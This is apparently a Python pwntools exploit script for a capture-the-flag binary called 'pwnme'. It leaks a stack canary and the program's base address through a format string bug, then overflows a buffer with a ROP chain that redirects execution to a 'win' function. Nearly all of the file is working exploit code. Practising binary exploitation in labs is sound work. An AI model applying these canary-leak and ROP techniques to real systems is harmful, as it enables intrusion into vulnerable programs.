#!/usr/bin/python3

from pwn import *

'''
1. We need to determine the base address with gdb
2. We need to leak addresses with a format string vulnerability in printf (see leak_address.py)
3. Examine the addresses and determine what addresses we leaked using the same technique we used in previous example
4. Get the address of the canary. Run leak_address.py multiple times and look for random address that ends with
5. Get the address of base. In the example below, we were able to leak the address of main + 28
To get the address of base we need to take main function's offset and 28 from the leaked address.
'''

e = ELF('./pwnme')
main_offset = e.symbols['main']
win_offset = e.symbols['win']

ret_offset = 0x101a
pop_offset = 0x1383

# Leak address first
p = process('./pwnme')
get_leak_payload = b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
p.sendlineafter(b'How about creating a leak AND smashing a canary?', get_leak_payload)
# Call recvall() first to see how many bytes we need to recv
# p.recvall()
leak = p.recv(168).decode().replace('(nil)', '0x1')
leaked = leak.split('0x')
main_28 = int(leaked[15],16)
base_address = main_28 - 28 - main_offset
canary = int(leaked[13],16)
print(f'Leak: {leak}')
print(f'Leaked main+28 (15th address): {hex(main_28)}')
print(f'Base address {hex(base_address)}')
print(f'Canary: {hex(canary)}')

canary_offset = 24
buffer_overflow_offset = 40

payload = canary_offset * b'A'
payload += p64(canary)
payload += (buffer_overflow_offset - canary_offset - 8) * b'A'
payload += p64(base_address + ret_offset)
payload += p64(base_address + pop_offset)
payload += p64(0xdeadbeef)
payload += p64(base_address + win_offset)
p.sendline(payload)
p.interactive()
